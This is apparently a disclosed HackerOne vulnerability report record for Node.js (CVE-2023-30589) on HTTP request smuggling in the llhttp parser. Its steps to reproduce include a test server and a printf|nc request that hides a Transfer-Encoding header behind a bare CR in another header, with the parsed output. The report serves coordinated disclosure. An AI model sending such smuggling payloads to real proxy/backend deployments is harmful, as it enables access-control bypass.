{
  "id": 2001873,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDAxODcz",
  "url": "https://hackerone.com/reports/2001873",
  "title": "HTTP Request Smuggling via Empty headers separated by CR",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-05-25T13:38:29.132Z",
  "submitted_at": "2023-05-25T13:38:29.301Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "yadhukrishnam",
    "url": "/yadhukrishnam",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-30589"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-06-20T21:04:25.574Z",
  "bug_reporter_agreed_on_going_public_at": "2023-06-20T21:04:25.460Z",
  "team_member_agreed_on_going_public_at": "2023-06-20T20:59:06.368Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** \nThe `llhttp` parser in the http module in Node v20.2.0 does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).\n\n**Description:** \nThe CR character (without LF) is sufficient to delimit HTTP header fields in the llhttp parser. According to RFC7230 section 3, only the CRLF sequence should delimit each header-field.\n\n## Steps To Reproduce:\n\n*Server:*\n\n```javascript\nconst http = require(\"http\");\n\nhttp\n  .createServer((request, response) => {\n    let body = [];\n    request\n      .on(\"error\", (err) => {\n        response.end(\"Request Error: \" + err);\n      })\n      .on(\"data\", (chunk) => {\n        body.push(chunk);\n      })\n      .on(\"end\", () => {\n        body = Buffer.concat(body).toString();\n\n        // log the body to stdout to catch the smuggled request\n        console.log(\"Response\");\n        console.log(request.headers);\n        console.log(body);\n        console.log(\"---\");\n\n        response.on(\"error\", (err) => {\n          // log the body to stdout to catch the smuggled request\n          response.end(\"Response Error: \" + err);\n        });\n\n        response.end(\n          \"Body length: \" + body.length.toString() + \" Body: \" + body\n        );\n      });\n  })\n  .listen(5000);\n```\n\n*Payload:*\n\n1. Execute the below command.\n```shell\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n             \"Host: localhost:5000\\r\\n\"\\\n             \"X-Abc:\\rxTransfer-Encoding: chunked\\r\\n\"\\\n             \"\\r\\n\"\\\n             \"1\\r\\n\"\\\n             \"A\\r\\n\"\\\n             \"0\\r\\n\"\\\n             \"\\r\\n\" | nc localhost 5000\n```\n\n2. Note that the value of `X-Abc` header in the request is - `[\\r]xTransfer-Encoding: chunked[\\r\\n]`\n3. The llhttp library parses this as a `Transfer-Encoding: chunked` header.\n```\nResponse\n{ host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' }\nA\n---\n```\n\n*Note:*\n1. The next character to `\\r` is missing in the parsed header name.\n2.  This test case is missing from https://github.com/nodejs/llhttp/blob/main/test/request/invalid.md.\n\nA frontend proxy that does not consider `\\r` as termination of an HTTP header value, could forward this to a backend, causing an HRS. \n\n## Supporting Material/References:\n\nThis report is similar to:\n  * https://hackerone.com/reports/1888760\n\n## Impact\n\nHTTP Request Smuggling can lead to access control bypass.",
  "weakness": {
    "id": 86,
    "name": "HTTP Request Smuggling"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-07-20T20:59:06.463Z",
  "allow_singular_disclosure_after": -17948274.694056045,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "mokusou",
    "zy9ard3",
    "yadhukrishnam",
    "hacktube5-official",
    "jonp270",
    "meispi",
    "kuraakka"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
